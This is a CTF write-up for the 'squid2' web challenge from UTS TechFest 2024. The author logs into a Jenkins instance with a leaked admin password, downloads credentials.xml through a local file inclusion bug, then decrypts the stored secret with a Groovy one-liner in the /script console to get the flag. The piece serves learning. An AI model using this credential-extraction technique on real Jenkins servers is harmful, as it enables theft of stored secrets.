---
title: "squid2"
description: "I automated my jenkins installation. The guide I followed was from early last year, hope the version is still secure 🙂"
pubDate: 2024-06-29
ctf: "UTS TechFest 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-utstechfest/icon.png"
---

> Note: This is a part 2 to [squid1](/writeups/24-utstechfest-squid1)

Using the password from the environment variables earlier (`admin_password_you_cant_guess`) we can login to user `admin`.

Looking at the Credentials page, there is an encrypted credential `flag2`. By using the LFI vulnerability we can download the credentials at `/var/jenkins_home/credentials.xml`.

```xml
<?xml version='1.1' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1337.v60b_d7b_c7b_c9f">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <id>flag2</id>
          <description>its encrypted so it must be safe</description>
          <username>flag2</username>
          <password>{AQAAABAAAAAwCUulNsaJVDl75mG5AmwJ2+yjdYSwWakDQBiLw5YClGvGHYgb1cSxuvPyfQSkjGCWZEnSdxeP8k13u/jZ6H8YKw==}</password>
          <usernameSecret>false</usernameSecret>
          <scope>GLOBAL</scope>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
      </java.util.concurrent.CopyOnWriteArrayList>
    </entry>
  </domainCredentialsMap>
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
```

Using the `password` value, we can use the console at `/script` to decrypt it.

```
println( hudson.util.Secret.decrypt("{AQAAABAAAAAwCUulNsaJVDl75mG5AmwJ2+yjdYSwWakDQBiLw5YClGvGHYgb1cSxuvPyfQSkjGCWZEnSdxeP8k13u/jZ6H8YKw==}") )
```

Flag: `CSEC{D3cryp71ng_A11_7h5_53cr3t5!}`